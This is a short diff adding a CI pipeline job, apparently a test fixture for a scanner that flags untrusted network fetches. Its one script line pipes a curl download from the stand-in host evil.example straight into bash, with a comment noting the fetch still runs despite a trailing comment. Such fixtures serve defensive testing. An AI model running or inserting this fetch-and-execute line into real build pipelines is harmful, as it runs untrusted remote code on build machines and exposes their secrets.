@@ -1,0 +1,6 @@
+install:
+  image: alpine:3.19
+  script:
+    # An untrusted fetch inside the substitution still fires even with a
+    # trailing comment on the line.
+    - bash -c "$(curl -fsSL https://evil.example/x.sh)" # see docs.example.com
